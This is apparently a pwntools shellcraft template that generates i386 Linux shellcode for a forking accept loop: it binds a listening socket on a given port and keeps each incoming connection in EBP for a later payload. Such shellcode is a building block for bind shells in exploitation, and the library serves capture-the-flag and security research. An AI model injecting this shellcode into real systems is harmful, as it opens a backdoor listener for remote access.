<%
    from pwnlib.shellcraft import common
    from pwnlib.shellcraft import i386
    from socket import htons
%>
<%page args="port"/>
<%docstring>
    Args:
        port(int): the listening port
    Waits for a connection.  Leaves socket in EBP.
    ipv4 only
</%docstring>
<%
    acceptloop = common.label("acceptloop")
    looplabel = common.label("loop")
%>

${acceptloop}:
    /*  Listens for and accepts a connection on ${int(port)}d forever */
    /*  Socket file descriptor is placed in EBP */

    /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
    ${i386.push(0)}
    ${i386.push('SOCK_STREAM')}
    ${i386.push('AF_INET')}
    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_socket', 'esp')}

    ${i386.mov('esi', 'eax')}      /* keep socket fd */

    /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
    ${i386.push(0)}
    /* ${htons(port)} == htons(${port}) */
    ${i386.push('AF_INET | (%d << 16)' % htons(port))}
    ${i386.mov('ecx', 'esp')}

    ${i386.push(0x10)}    /* sizeof addr */
    ${i386.push('ecx')}   /* &addr */
    ${i386.push('eax')}   /* sock */
    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_bind', 'esp')}

    /*  listen(sock, whatever) */
    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_listen')}


${looplabel}:
    /*  accept(sock, NULL, NULL) */
    ${i386.push(0x0)}
    ${i386.push('esi')} /* sock */
    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_accept', 'esp')}

    ${i386.mov('ebp', 'eax')}      /* keep in-coming socket fd */

    ${i386.linux.syscall('SYS_fork')}
    xchg eax, edi

    test edi, edi
    ${i386.mov('ebx', 'ebp')}
    cmovz ebx, esi /*  on child we close the server sock instead */

    /*  close(sock) */
    ${i386.linux.syscall('SYS_close', 'ebx')}

    test edi, edi
    jnz ${looplabel}
